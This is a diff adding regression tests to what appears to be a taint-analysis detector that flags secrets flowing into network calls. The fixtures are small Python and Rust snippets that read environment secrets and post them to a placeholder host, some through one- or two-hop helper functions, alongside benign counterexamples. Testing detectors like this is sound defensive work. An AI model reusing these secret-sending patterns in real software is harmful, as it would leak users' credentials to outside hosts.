@@ -104,4 +104,58 @@ describe("polyglot taint (Python/Bash/Rust) + JS/TS dispatch", () => {
 	test("Bash: benign env var ($USER_NAME) is NOT flagged (no false positive)", () => {
 		assert.equal(flows("r6.sh", 'curl -X POST -d "$USER_NAME" http://api.example.com\n'), 0);
 	});
+
+	// ── interprocedural (function-summary) regressions ──
+	test("Python: return-taint helper (post(get_secret())) is flagged", () => {
+		assert.ok(
+			flows(
+				"ip1.py",
+				'import os,requests\ndef gs():\n    return os.getenv("K")\nrequests.post("http://x", data=gs())\n',
+			) > 0,
+		);
+	});
+	test("Python: param-to-sink (send(secret)) is flagged", () => {
+		assert.ok(
+			flows(
+				"ip2.py",
+				'import os,requests\ndef send(x):\n    requests.post("http://x", data=x)\nsend(os.getenv("SECRET"))\n',
+			) > 0,
+		);
+	});
+	test("Python: param-to-sink 2-hop is flagged", () => {
+		assert.ok(
+			flows(
+				"ip3.py",
+				'import os,requests\ndef inner(x):\n    requests.post("http://x", data=x)\ndef outer(y):\n    inner(y)\nouter(os.getenv("SECRET"))\n',
+			) > 0,
+		);
+	});
+	test("Python: helper returning a literal is NOT flagged", () => {
+		assert.equal(
+			flows("ip4.py", 'import requests\ndef gs():\n    return "hi"\nrequests.post("http://x", data=gs())\n'),
+			0,
+		);
+	});
+	test("Python: passing a secret to a non-sink function (print) is NOT flagged", () => {
+		assert.equal(
+			flows("ip5.py", 'import os\ndef send(x):\n    print(x)\nsend(os.getenv("SECRET"))\n'),
+			0,
+		);
+	});
+	test("Rust: return-taint helper via implicit return is flagged", () => {
+		assert.ok(
+			flows(
+				"ip6.rs",
+				'use std::env;\nfn gs() -> String { env::var("K").unwrap() }\nfn main(){ reqwest::blocking::Client::new().post("http://x").body(gs()).send().unwrap(); }\n',
+			) > 0,
+		);
+	});
+	test("Rust: param-to-sink is flagged", () => {
+		assert.ok(
+			flows(
+				"ip7.rs",
+				'use std::env;\nfn send(x: String){ reqwest::get(&x); }\nfn main(){ let s = env::var("K").unwrap(); send(s); }\n',
+			) > 0,
+		);
+	});
 });
